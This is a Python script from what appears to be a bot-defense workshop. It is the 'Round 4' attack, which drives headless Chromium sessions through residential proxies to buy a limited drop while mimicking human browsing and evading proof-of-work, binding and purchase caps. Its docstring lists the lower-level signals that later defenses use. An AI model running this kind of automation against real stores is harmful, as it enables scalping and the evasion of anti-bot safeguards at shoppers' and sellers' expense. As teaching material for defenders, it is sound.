"""
Round 4 attack (beats the proof of work, the binding and the cap): a real browser for every hoodie.

The attacker accepts the price Round 4 set. No handoff, no reuse: each hoodie gets its own headless
Chromium context (consistent headers) on its own sticky residential address, which browses like a
person (home page, click through, type an email, pick a size, wait a moment) and lets the page's own
JavaScript solve the proof of work.

To an HTTP-level defense, this IS a shopper. Every W1 signal is genuine: clean IP, real Chromium
headers in real order, a session that landed and ran the page script, the honeypot untouched, a solved
proof of work bound to the address that solved it, one purchase per session.

What it costs the attacker, and what Workshop 2 adds:
  - a browser per unit and a sticky residential address per unit: real money at scale, which is the
    point of W1's layers
  - automation leaves traces below HTTP: navigator.webdriver and CDP artefacts (W2 Ch1), a JS
    challenge that checks the environment (W2 Ch4), mouse and keyboard behaviour (W2 Ch5),
    fingerprint consistency (W2 Ch2), and the TLS/HTTP2 handshake (W2 Ch3)

Expected (tools/checkpoint.py):
  Round 4 / Drop Day  still buys a share of the drop

Needs a browser: pip install -r requirements-browser.txt && python -m playwright install chromium

    python attacks/round4_full_browser.py
"""

import asyncio
import random
import time

import _drop as d
from labclient import BASE_URL, world_pool

BROWSERS = 3         # sessions in flight at once
MAX_SESSIONS = 30
DEADLINE = 40        # seconds


async def one_session(browser, ip, i, rng, tally, state):
    context, page = await d.async_page(browser, "bot:r4_browser", ip)
    try:
        r = await page.goto(BASE_URL + "/")
        tally.statuses[r.status] += 1
        await page.wait_for_timeout(rng.uniform(700, 1400))              # look at the home page
        await page.click(f"a.drop-card[data-sku='{d.SKU}']")
        try:
            await page.wait_for_selector("form.buy", timeout=30000)        # the page solves its own proof of work
        except Exception:
            state["no_form"] += 1
            if "Sold out" in await page.content():
                state["sold_out"] = True
            return
        await page.type("input[name=email]", f"fb{i}@scalp.example", delay=70)   # typed, not pasted
        await page.wait_for_timeout(rng.uniform(1100, 1600))
        tally.attempted += 1
        async with page.expect_navigation(timeout=30000) as nav:
            await page.click("#drop-buy")
        response = await nav.value
        tally.statuses[response.status] += 1
        if response.status == 200 and "order-confirmed" in await page.content():
            tally.believed += 1
        elif response.status == 410:
            state["sold_out"] = True
    except Exception as exc:
        state[type(exc).__name__] = state.get(type(exc).__name__, 0) + 1
    finally:
        await context.close()


async def main(seed, tally):
    from playwright.async_api import async_playwright
    pool, rng = world_pool("residential_proxy_net"), random.Random(seed)
    state = {"sold_out": False, "no_form": 0, "sessions": 0}
    started = time.perf_counter()
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        sem = asyncio.Semaphore(BROWSERS)

        async def guarded(i):
            async with sem:
                if state["sold_out"] or time.perf_counter() - started > DEADLINE:
                    return
                state["sessions"] += 1
                await one_session(browser, rng.choice(pool), i, rng, tally, state)

        await asyncio.gather(*(guarded(i) for i in range(MAX_SESSIONS)))
        await browser.close()
    return state


def run(seed=4):
    tally = d.Tally("round4_full_browser")
    state = asyncio.run(main(seed, tally))
    tally.requests = sum(tally.statuses.values())
    tally.extra.update(browser_sessions=state["sessions"], no_form=state["no_form"])
    return tally


if __name__ == "__main__":
    d.finish("Round 4: one real browser per hoodie", run())
